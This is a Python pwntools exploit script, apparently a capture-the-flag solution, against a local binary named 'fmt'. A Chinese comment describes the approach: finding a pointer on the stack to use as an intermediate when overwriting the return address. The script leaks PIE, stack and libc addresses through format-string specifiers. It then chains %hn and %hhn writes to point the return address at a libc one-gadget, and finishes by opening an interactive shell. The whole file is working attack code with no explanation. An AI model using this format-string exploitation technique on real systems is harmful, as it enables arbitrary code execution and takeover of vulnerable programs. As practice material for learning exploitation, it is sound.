#寻找栈上指针来作为中间变量修改返回地址
from pwn import *
context.log_level = 'debug'
p = process("./fmt")
def inp():
	p.sendlineafter("Exit\n", '1')
gdb.attach(p)
inp()
p.sendlineafter("something\n", '%5$p-%6$p-%15$p')
leak = p.recv()
pie = int(leak[2:10], 16)-8120
stack = int (leak[13:21], 16)
libc_base = int(leak[24:33], 16) - 99895
log.success("pie ==> " + hex(pie))
log.success("stack ==> " + hex(stack))
log.success("libc_base ==> " + hex(libc_base))
ret_addr = stack + 0xffbe0bcc - 0xffbe0c64
N_addr =  (stack + 0xff95d8b4 - 0xff9fd974 + 3) & 0xffff
one = libc_base + 0x3a80e
p.sendline("1")
p.sendlineafter("something\n", '%'+str(N_addr)+'d%21$hn')
sleep(1)
inp()
p.sendlineafter("something\n", '%255d%57$hhn')
inp()
p.sendlineafter("something\n", '%'+str(ret_addr&0xffff)+'d%21$hn')
inp()
p.sendlineafter("something\n", '%'+str(ret_addr+2&0xffff)+'d%22$hn')
inp()
p.sendlineafter("something\n", '%'+str(one&0xffff)+'d%57$hn')
inp()
p.sendlineafter("something\n", '%'+str(one>>16)+'d%59$hn')
p.interactive()